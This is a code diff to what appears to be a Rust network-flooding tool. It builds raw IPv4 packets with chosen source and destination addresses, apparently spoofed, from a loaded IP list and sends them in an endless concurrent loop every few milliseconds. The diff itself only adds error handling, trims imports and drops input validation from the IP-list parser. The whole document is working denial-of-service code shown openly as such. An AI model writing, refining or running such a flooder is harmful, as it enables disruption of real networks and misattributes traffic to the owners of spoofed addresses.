@@ -1,8 +1,8 @@
 use pnet::packet::{ip::IpNextHeaderProtocols, Packet};
 use pnet::packet::ipv4::MutableIpv4Packet;
-use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportProtocol, ipv4_packet_iter};
+use pnet::transport::{transport_channel, TransportChannelType::Layer3, ipv4_packet_iter};
 use rand::seq::SliceRandom;
-use std::{fs, thread, time::Duration};
+use std::{fs, time::Duration};
 use tokio::sync::Semaphore;
 use std::net::Ipv4Addr;
 
@@ -31,11 +31,15 @@ async fn send_random_null_packet(ip_list: &[Ipv4Addr], semaphore: &Semaphore) {
     ipv4_packet.set_source(src_ip);
     ipv4_packet.set_destination(dst_ip);
 
-    // Send packet
-    let (mut tx, _) = transport_channel(1024, Layer3(IpNextHeaderProtocols::Tcp)).unwrap();
-    tx.send_to(ipv4_packet.packet(), dst_ip.into()).unwrap();
-
-    println!("Sent null packet from {} to {}", src_ip, dst_ip);
+    // Send packet with error handling
+    match transport_channel(1024, Layer3(IpNextHeaderProtocols::Tcp)) {
+        Ok((mut tx, _)) => {
+            if tx.send_to(ipv4_packet.packet(), dst_ip.into()).is_err() {
+                eprintln!("Failed to send packet from {} to {}", src_ip, dst_ip);
+            }
+        }
+        Err(e) => eprintln!("Failed to open transport channel: {:?}", e),
+    }
 }
 
 async fn continuous_packet_flood(ip_list: Vec<Ipv4Addr>) {
@@ -45,17 +49,17 @@ async fn continuous_packet_flood(ip_list: Vec<Ipv4Addr>) {
         let permits: Vec<_> = (0..MAX_THREADS)
             .map(|_| send_random_null_packet(&ip_list, &semaphore))
             .collect();
-        
+
         futures::future::join_all(permits).await;
         tokio::time::sleep(Duration::from_millis(10)).await;
     }
 }
 
 fn load_ip_list(filename: &str) -> Vec<Ipv4Addr> {
-    let contents = fs::read_to_string(filename).expect("Failed to read IP list");
-    contents
+    fs::read_to_string(filename)
+        .expect("Failed to read IP list")
         .lines()
-        .filter_map(|line| line.trim().parse().ok())
+        .map(|line| line.parse().unwrap()) // No validation; expects each line to be a valid IP
         .collect()
 }
 
